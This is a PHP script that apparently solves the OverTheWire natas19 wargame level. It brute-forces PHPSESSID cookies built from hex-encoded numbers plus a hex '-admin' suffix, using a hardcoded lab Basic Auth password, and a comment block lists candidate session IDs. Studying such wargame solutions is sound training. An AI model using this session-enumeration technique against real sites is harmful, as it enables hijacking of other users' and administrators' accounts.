<?php

$url = "http://natas19.natas.labs.overthewire.org";
$numbers = range(3100000,3800000);

foreach ($numbers as $n) {
    $next = strval($n);
    $i = strlen($next);
    if (($next[$i-1] == 2) && ($next[2] == 3) && ($next[4] == 3)) {
        $sid = $next . "d61646d696e";
        $headers = array(
            "Authorization: Basic ". base64_encode("natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"),
        "Cookie: PHPSESSID=" . $sid);
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        //curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
        //curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
        $out = curl_exec($curl);

        echo "Trying sessionID $sid:...";
        $url = "http://natas19.natas.labs.overthewire.org/index.php";
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_POST, 1);
        //curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
        //curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
        curl_setopt($curl, CURLOPT_POSTFIELDS, "username=admin&password=1");
        $out = curl_exec($curl);
        echo "length:" . strlen($out) . "\n";
        //$result = file('cookies.txt');
        //$tmp = preg_replace('/\s+/', ' ',$result[4]);
        //$tmp = explode(' ',$tmp);
        //echo "$tmp[6]\n";
    }
}

curl_close($curl);
/*
3133332d61646d696e
3630372d61646d696e
3138342d61646d696e
3633382d61646d696e
3435372d61646d696e
3432322d61646d696e
3335342d61646d696e
3333302d61646d696e
3131352d61646d696e
3235382d61646d696e
37352d61646d696e
3339392d61646d696e
3536312d61646d696e
3231322d61646d696e
3333352d61646d696e
*/
